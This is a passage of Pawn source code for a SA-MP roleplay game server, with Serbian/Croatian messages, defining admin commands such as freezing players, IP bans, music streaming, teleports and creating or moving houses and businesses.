			   	DodajWarnRed("~y~(FREEZE) %s ~w~je zaledi%s igraca ~y~%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unfreeze( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unfreeze [id]");
		if( IsPlayerConnected( id ) )
		{
			if( id != IPI )
			{
				SMG_TogglePlayerControllable( id, true );

				SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vas je odledi%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				SendInfoMessage( playerid, "Odledili ste igraca {FFFFFF}%s.", ImeIgraca( id ) );
 
			   	DodajWarnRed("~y~(UNFREEZE) %s ~w~je odledi%s igraca ~y~%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
			}
		}
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unbanip( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
	    new playersip[44];
		if( sscanf( params, "s[44]", playersip ) )
		{
			SendUsageMessage( playerid, "/unbanip [ip]");
			return 1;
		}
		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
		ServerInfo[ BanovanihKorisnika ]--;

		format( globalstring, 50, "unbanip %s", playersip );
		SendRconCommand( globalstring );
		SendRconCommand( "reloadbans" );
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je unbanova%s IP %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), playersip );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

new MuzikaUrl[256];
CMD:pustimuziku( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
		new url[256],
			naziv[40];

		if( sscanf( params, "s[256]s[40]", url, naziv ) )
		{
			SendUsageMessage( playerid, "/pustimuziku [url] [naziv]");
			return 1;
		}

		strmid( MuzikaUrl, url, 0, strlen( url ), 256 );
		foreach( new i : Player)
		{
        	StopAudioStreamForPlayer( i );
  			PlayAudioStreamForPlayer( i, url );
       	}
		SendClientMessageToAllEx( 0xFF4500FF, "#MUZIKA: %s {FFFFFF}%s {FF4500}je pustio pesmu, naziv: {FFFFFF}%s", getAdminRankName( playerid ), ImeIgraca( playerid ), naziv );
		SendClientMessageToAll( 0xFF4500FF, "#MUZIKA: Da ugasite upisite {FFFFFF}[ /music > Off ], {FF4500}da bi ponovo pustili kucajte {FFFFFF}[ /replaymusic ]." );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:replaymusic( playerid )
{
	StopAudioStreamForPlayer( playerid );
	PlayAudioStreamForPlayer( playerid, MuzikaUrl );

	SendInfoMessage( playerid, "Ponovo ste pustili muziku." );
    return 1;
}

CMD:entercar( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new vehicleid;
		if( sscanf( params, "i", vehicleid ) )
		{
			SendUsageMessage( playerid, "/entercar [veh id]");
			return 1;
		}

		PutPlayerInVehicle( playerid, vehicleid, 0 );
		SendInfoMessage( playerid, "Usli ste u vozilo ID {FFFFFF}(%d).", vehicleid );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:banip( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
	    new playersip[22];
		if( sscanf( params, "s[22]", playersip ) )
		{
			SendUsageMessage( playerid, "/banip [ip]");
			return 1;
		}

		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
		ServerInfo[ BanovanihKorisnika ]++;

		format( globalstring, 44, "banip %s", playersip );
		SendRconCommand( globalstring );
		SendRconCommand( "reloadbans" );
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je banova%s IP %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), playersip  );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:gotocar( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		new id;
		if( sscanf(params, "i", id ) ) return SendUsageMessage( playerid, "/gotocar [carid(/dl)]");

		new Float:cwx2, Float:cwy2, Float:cwz2;
		GetVehiclePos( id, cwx2, cwy2, cwz2 );
		if( GetPlayerState( playerid ) == 2 )
		{
			new tmpcar = GetPlayerVehicleID( playerid );
			SMG_SetVehiclePos( tmpcar, cwx2, cwy2, cwz2 );
		}
		else SMG_SetPlayerPos( playerid, cwx2, cwy2, cwz2 );

		SCMF(playerid, 0xCCCCCCFF, "(GOTOCAR): Teleportirani ste do vozila {FFFFFF}(%d).", id);
		SetPlayerInterior( playerid, 0 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:getcar( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 3 )
	{
		new car;
		if( sscanf( params, "i", car ) )
		{
			SendUsageMessage( playerid, "/getcar [carid(/dl)]");
			return 1;
	    }

	    if( car != IVI )
		{
	        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 3 && PlayerInfo[ playerid ][ xAdmin ] == 0 )
			{
	            if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok svercas." );
			    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok si na CS-DM." );
			    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok si na trci." );
			    if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
			    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok radis posao ili imas uniformu posla." );
				if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok imas wanted level." );
				if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok si u jailu." );
	            if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok je pljacka u toku." );
	            if( GetPlayerInterior( playerid ) > 0 ) return SendErrorMessage( playerid, "Ne mozes getcar vozilo dok si u interijeru.");

	            new slot = -1;
				for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
					if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == car )
					{
						slot = j;
						break;
					}
				}
				if( slot == -1 )
				{
					if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ car ][ vSqlID ] ) { }
					else return SendErrorMessage( playerid, "Mozete samo vase vozilo ili vozilo cije imate kljuceve." );
			  	}
			}
	        else
			{
	            if( PlayerInfo[ playerid ][ xAdmin ] <= 4 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
			}

			new Float:plocx, Float:plocy, Float:plocz;
			GetPlayerPos( playerid, plocx, plocy, plocz );
			SMG_SetVehiclePos( car, plocx, plocy+4, plocz );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:gotofirma(playerid)
{
	if(PlayerInfo[playerid][xVIPLevel] < 4) return SendErrorMessage(playerid, "Niste ovlasceni.");
	if(PlayerInfo[playerid][xFirmaID] == -1) return SendErrorMessage(playerid, "Nemate firmu.");
	if(PlayerInfo[playerid][xWanted] != 0) return SendErrorMessage(playerid, "Imate wanted.");
	if(GetPlayerAnimationIndex(playerid) == 1130) return SendErrorMessage(playerid, "Ne mozes koristiti komandu jer padas. (ANTI-BA)");
	if(PosaoRudar[playerid] != 0) return SendErrorMessage(playerid, "Ne mozete dok radite. (ANTI-BA)");
	if(PlayerCuffed[playerid] != 0 || IgracZavezan[playerid]) return SendErrorMessage(playerid, "Ne mozete dok ste vezani. (ANTI-BA)");
	if(gZone_gID[playerid] != -1) return SendErrorMessage(playerid, "Ne mozete dok zauzimate. (ANTI-BA)");
	if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok svercas." );
    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si na CS:DM." );
    if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
	if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );
	if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
	if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );
	if( ServerInfo[ PaketPoceo ] ) return SendErrorMessage( playerid, "Ne mozes se portati jer je pokrenut sistem paketa za mafije (ANTI-BA)." );
    if( gettime() < CooldownPort[ playerid ] ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", CooldownPort[ playerid ] - gettime() );

    new b = PlayerInfo[playerid][xFirmaID];
    SMG_SetPlayerPos(playerid, BusinessInfo[b][bEnterX], BusinessInfo[b][bEnterY], BusinessInfo[b][bEnterZ]);
    CooldownPort[ playerid ] = gettime()+60;
    SendClientMessage(playerid, 0xFFFF0000, "(FIRMA): Teleportovali ste se do svoje firme.");
 
    DodajWarnRed("~y~(BIZZ) %s ~w~se teleportova%s do svoje firme ~y~ID %d.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), PlayerInfo[playerid][xFirmaID]);
	return 1;
}

CMD:zatvoreni( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
        strcat( DialogStrgEx, "{33CCFF}* Online igraci u jailu / prisonu:\n\n{FFFFFF}" );

		foreach( new i : Player)
		{
 			if( PlayerInfo[ i ][ xZatvor ] >= 1)
			{
				format( globalstring, sizeof( globalstring ), "%s(%d) - %d minuta\n", ImeIgraca( i ), i, PlayerInfo[ i ][ xZatvorVreme ] );
				strcat( DialogStrgEx, globalstring );
			}
		}

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Zatvoreni:", DialogStrgEx, "OK", "" );
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:trazeni( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
        strcat( DialogStrgEx, "{33CCFF}* Online igraci sa wanted levelom:\n\n{FFFFFF}" );

		foreach( new i : Player)
		{
 			if( PlayerInfo[ i ][ xWanted ] >= 1)
			{
				format( globalstring, sizeof( globalstring ), "%s(%d) - Wanted: %d\n", ImeIgraca( i ), i, PlayerInfo[ i ][ xWanted ] );
				strcat( DialogStrgEx, globalstring );
			}
		}

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Trazeni:", DialogStrgEx, "OK", "" );
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:utisani( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
        strcat( DialogStrgEx, "{33CCFF}* Online utisani\n\n:{FFFFFF}" );

		foreach( new i : Player)
		{
 			if( PlayerInfo[ i ][ xWanted ] != 0)
			{
				format( globalstring, sizeof( globalstring ), "%s(%d)\n", ImeIgraca( i ), i );
				strcat( DialogStrgEx, globalstring );
			}
		}

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Utisani:", DialogStrgEx, "OK", "" );
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pweapons( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
		new id;
		if( sscanf( params, "u", id ) )
		{
			SendUsageMessage( playerid, "/pweapons [id]");
			return 1;
	    }

		if( IsPlayerConnected( id ) )
		{
		    if( id != IPI )
			{
		        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
				{
				    new weapon[13], bullets[13];

					SCMF( playerid, ZELENA, "%s", ImeIgraca( id ) );

				    for( new slot = 0; slot < 13; slot++)
					{
	                    GetPlayerWeaponData( id, slot, weapon[ slot ], bullets[ slot ] );

					   	SCMF( playerid, -1, "    SLOT: %d, ORUZJE: %s, METAKA: %d.", slot, WeapNames[ weapon[ slot ] ], bullets[ slot ]  );
				    }
				}
				else
				{
					SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
					return 1;
				}
			}
		}
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:odbrojavanje( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new seconds;
		if( sscanf( params, "i", seconds ) ) return SendUsageMessage( playerid, "/odbrojavanje [sekundi]");
		if(PlayerInvited[playerid] == 0) return SendErrorMessage(playerid, "Moras se joinat na event da pokrenes count.");
		if( seconds > 20 ) return SendErrorMessage( playerid, "Sekunde nemogu biti manje od 1 i vece od 20!");
	 	if( cseconds ) return SendErrorMessage( playerid, "Vec je odbrojavanje u tijeku.");
	 	if( seconds > 0 )
	 	{
	  		SCMF( playerid, 0x33CCFFFF, "#COUNT: {FFFFFF}Zapoceli ste odbrojavanje od {33CCFF}(%d) {FFFFFF}sekundi.", seconds );
	   		cseconds = seconds+1;

	   		foreach(new i : Player) 
		    {
		   		if( PlayerInvited[ i ] > 0 ) SetTimer_("CountTimer", 1000, 1000, cseconds);
		   	}
	      	DodajWarnRed("~y~(COUNT) %s ~w~je pokrenu%s odbrojavanje.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	   	}
   		else SendErrorMessage( playerid, "Sekunde moraju biti vece od i manje od 20!");
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
alias:odbrojavanje("count");

_:public CountTimer()
{
	if( cseconds )
	{
        format( cstring, sizeof(cstring), "~w~%d", cseconds-1 );
        GameTextForAll( cstring, 1100, 4 );
        SoundForAll( 1056 );

        cseconds--;

        if( !cseconds )
        {
            GameTextForAll( "~r~GO GO GO!!!", 2000, 4 );
            SoundForAll( 1057 );
        }
	}
	return 1;
}

CMD:nstan( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

    new im = Iter_Free(iter_Imovina);
	if( II[ (MAX_IMOVINA-1) ][ iSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreirane imovine." );

	II[ im ][ iUsage ] = IMOVINA_STAN;
	II[ im ][ iExit ][ 0 ] = STAN_X;
	II[ im ][ iExit ][ 1 ] = STAN_Y;
	II[ im ][ iExit ][ 2 ] = STAN_Z;
	II[ im ][ iPrice ] = STAN_PRICE;
	II[ im ][ iInterior ] = STAN_INT;
	II[ im ][ iVrsta ] = 0;
	II[ im ][ iOwned ] = 0;
	II[ im ][ iOnAuction ] = false;
	II[ im ][ iOwnerSQLID ] = -1;
	II[ im ][ iNeaktivnost ] = 0;
	strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
	GetPlayerPos( playerid, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
	II[ im ][ iLocked ] = 0;
	II[ im ][ iVW ] = im;
	II[ im ][ iLevel ] = 3;
	strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
	II[ im ][ iMats ] = 0;
	II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
	II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
	II[ im ][ iDrugAmmount ] = 0;
	II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0;
	mSQL_CreateProperty( im );

	new string[ 220 ];
	format( string, sizeof( string ),
										"(STAN - [%d])\n\
										Cena: {FFFFFF}$%d\n\
										{FF0000}Level: {FFFFFF}%d\n\
										{FF0000}Adresa: {FFFFFF}%s\n\
										{FF0000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );

	ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0xFF0000FF, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
	ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], .priority = 26 );
	SendInfoMessage( playerid, "Uspesno si kreirao stan." );
	return 1;
}

CMD:nkuca( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	new vrsta;
	if( sscanf( params, "i", vrsta ) ) return SendUsageMessage( playerid, "/nkuca [ 1(mala) | 2(srednja) | 3(velika) ]" );

	new im = Iter_Free(iter_Imovina);
	if( II[ (MAX_IMOVINA-1) ][ iSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreirane imovine." );

	if( vrsta == MALA_KUCA )
	{
		II[ im ][ iUsage ] = IMOVINA_KUCA;
		II[ im ][ iExit ][ 0 ] = MALA_KUCA_X;
		II[ im ][ iExit ][ 1 ] = MALA_KUCA_Y;
		II[ im ][ iExit ][ 2 ] = MALA_KUCA_Z;
		II[ im ][ iInterior ] = MALA_KUCA_INT;
		II[ im ][ iPrice ] = MALA_KUCA_PRICE;
		II[ im ][ iVrsta ] = MALA_KUCA;
	}
	else if( vrsta == SREDNJA_KUCA )
	{
		II[ im ][ iUsage ] = IMOVINA_KUCA;
		II[ im ][ iExit ][ 0 ] = SREDNJA_KUCA_X;
		II[ im ][ iExit ][ 1 ] = SREDNJA_KUCA_Y;
		II[ im ][ iExit ][ 2 ] = SREDNJA_KUCA_Z;
		II[ im ][ iPrice ] = SREDNJA_KUCA_PRICE;
		II[ im ][ iInterior ] = SREDNJA_KUCA_INT;
		II[ im ][ iVrsta ] = SREDNJA_KUCA;
	}
	else if( vrsta == VELIKA_KUCA )
	{
		II[ im ][ iUsage ] = IMOVINA_KUCA;
		II[ im ][ iExit ][ 0 ] = VELIKA_KUCA_X;
		II[ im ][ iExit ][ 1 ] = VELIKA_KUCA_Y;
		II[ im ][ iExit ][ 2 ] = VELIKA_KUCA_Z;
		II[ im ][ iPrice ] = VELIKA_KUCA_PRICE;
		II[ im ][ iInterior ] = VELIKA_KUCA_INT;
		II[ im ][ iVrsta ] = VELIKA_KUCA;
	}
	II[ im ][ iOwned ] = 0;
	II[ im ][ iOnAuction ] = false;
	II[ im ][ iOwnerSQLID ] = -1;
	II[ im ][ iNeaktivnost ] = 0;
	strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
	GetPlayerPos( playerid, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
	II[ im ][ iLocked ] = 0;
	II[ im ][ iVW ] = im;
	II[ im ][ iLevel ] = 5;
	strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
	II[ im ][ iMats ] = 0;
	II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
	II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
	II[ im ][ iDrugAmmount ] = 0;
	II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0;
	mSQL_CreateProperty( im );

	new string[ 220 ];
	format( string, sizeof( string ),
										"(KUCA - [%d])\n\
										Vrsta: {FFFFFF}%s\n\
										{4282C0}Cena: {FFFFFF}$%d\n\
										{4282C0}Level: {FFFFFF}%d\n\
										{4282C0}Adresa: {FFFFFF}%s\n\
										{4282C0}[ /kupiimovinu ]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );

	ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x4282C0FF, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
	ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], .priority = 26 );
	SendInfoMessage( playerid, "Uspesno si kreirao kucu." );
	return 1;
}

CMD:pomerilokaciju( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7)
	{
		new Float:Pos[ 3 ], izbor, ID;
		if( sscanf( params, "ii", izbor, ID ) )
		{
			SendUsageMessage( playerid, "/pomerilokaciju [ izbor ] [ id ]");
			SendClientMessage( playerid, -1, "[Izbor] 1. Imovina | 2. Firma | 3. Organizacija");
			return 1;
		}
		if( izbor == 1 )
		{
			if( II[ID][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
	        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        II[ ID ][ iEnter ][ 0 ] = Pos[ 0 ];
			II[ ID ][ iEnter ][ 1 ] = Pos[ 1 ];
			II[ ID ][ iEnter ][ 2 ] = Pos[ 2 ];
			PropertyRefresh( ID );
			SaveProperty( ID );
			SendInfoMessage( playerid, "Uspesno ste prebacili lokaciju imovine ID {FFFFFF}(%d).", ID );
		}
		else if( izbor == 2 )
		{
		    if( BusinessInfo[ ID ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

	        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        BusinessInfo[ ID ][ bEnterX ] = Pos[ 0 ];
			BusinessInfo[ ID ][ bEnterY ] = Pos[ 1 ];
			BusinessInfo[ ID ][ bEnterZ ] = Pos[ 2 ];
			BusinessInfo[ ID ][ bInt ] = GetPlayerInterior( playerid );
		    BusinessInfo[ ID ][ bVW ] = GetPlayerVirtualWorld( playerid );
			Bussines_Refresh( ID );

			new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_enter_x` = '%f', `b_enter_y` = '%f', `b_enter_z` = '%f', `b_enter_int` = '%d', `b_enter_vw` = '%d' WHERE `bussines_id` = '%d'",
				BusinessInfo[ ID ][ bEnterX ],
				BusinessInfo[ ID ][ bEnterY ],
				BusinessInfo[ ID ][ bEnterZ ],
				BusinessInfo[ ID ][ bInt ],
				BusinessInfo[ ID ][ bVW ],
				BusinessInfo[ ID ][ b_ID ] );
		   	mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Uspesno ste prebacili lokaciju firme ID {FFFFFF}(%d).", ID );
		}
		else if( izbor == 3 )
		{
		    if( ID < 1 || org_info[ ID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
	        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        org_info[ ID ][ oPozExtX ] = Pos[ 0 ];
			org_info[ ID ][ oPozExtY ] = Pos[ 1 ];
			org_info[ ID ][ oPozExtZ ] = Pos[ 2 ];
			Orge3D( ID );

			new q[ 180 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `enter_pos_x` = '%f', `enter_pos_y` = '%f', `enter_pos_z` = '%f' WHERE `org_id` = '%d' LIMIT 1",
				org_info[ ID ][ oPozExtX ],
				org_info[ ID ][ oPozExtY ],
				org_info[ ID ][ oPozExtZ ],
				org_info[ ID ][ oID ] );
			mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Uspesno ste prebacili lokaciju organizacije ID {FFFFFF}(%d).", ID );
		}
		else return SendErrorMessage( playerid, "Pogresan broj izabrane vrste." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:dodajfakture( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new id, fakture;
	if( sscanf( params, "ii", id, fakture ) ) return SendUsageMessage( playerid, "/dodajfakture [bizz id]");
	if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

    BusinessInfo[ id ][ bFacture ] += fakture;

    sql_bussines_update_integer( id, "b_facture", BusinessInfo[ id ][ bFacture ] );
   	SendInfoMessage( playerid, "Uspesno si ubacio {FFFFFF}(%d) {4282C0}faktura u bizz {FFFFFF}(%d), {4282C0}trenutno ima {FFFFFF}(%d).", fakture, id, BusinessInfo[ id ][ bFacture ] );
   	Bussines_Refresh( id );
    return 1;
}

CMD:checkbusiness( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new id;
	if( sscanf( params, "i", id)) return SendUsageMessage( playerid, "/checkbusiness [bizz id]");

	if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

	new string[150], naslov[24];
    strdel( string, 0, sizeof( string ) );

    format( string, sizeof( string ), "{4282C0}Vlasnik: {FFFFFF}%s\n\
    								   {4282C0}Ime Firme: {FFFFFF}%s\n\
    								   {4282C0}Novac: {FFFFFF}($%s)\n\
    								   {4282C0}Fakture: {FFFFFF}(%s)", BusinessInfo[ id ][ bOwner ], BusinessInfo[ id ][ bName ], fNumber(BusinessInfo[id][bMoney]), fNumber(BusinessInfo[id][bFacture]) );
	format( naslov, sizeof( naslov ), "ID: %d | SQLID: %d", id, BusinessInfo[ id ][ b_ID ]);

	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, naslov, string, "OK", "" );
	strdel( string, 0, sizeof( string ));
    return 1;
}

CMD:proveriimovinu( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new id;
	if( sscanf( params, "i", id ) ) return SendUsageMessage( playerid, "/proveriimovinu [id]");

	if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");

    new wepname1[ 32 ], wepname2[ 32 ], wepname3[ 32 ], wepname4[ 32 ];

	if( II[ id ][ iOruzje ][ 0 ] != 0) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 0 ] ] );
	else strmid(wepname1, "None", 0, 5);

	if( II[ id ][ iOruzje ][ 1 ] != 0) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 1 ] ] );
	else strmid(wepname2, "None", 0, 5);

	if( II[ id ][ iOruzje ][ 2 ] != 0) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 2 ] ] );
	else strmid(wepname3, "None", 0, 5);

